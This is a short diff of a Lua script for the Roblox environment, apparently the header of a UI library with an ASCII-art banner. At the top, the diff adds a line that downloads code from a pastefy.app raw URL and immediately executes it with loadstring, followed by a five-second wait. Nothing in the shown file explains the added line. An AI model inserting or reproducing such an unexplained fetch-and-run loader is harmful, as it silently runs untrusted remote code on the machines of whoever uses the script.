@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://pastefy.app/IJuPdZzp/raw"))()
+
+wait(5)
+
 --[[
      _      ___         ____  ______
     | | /| / (_)__  ___/ / / / /  _/
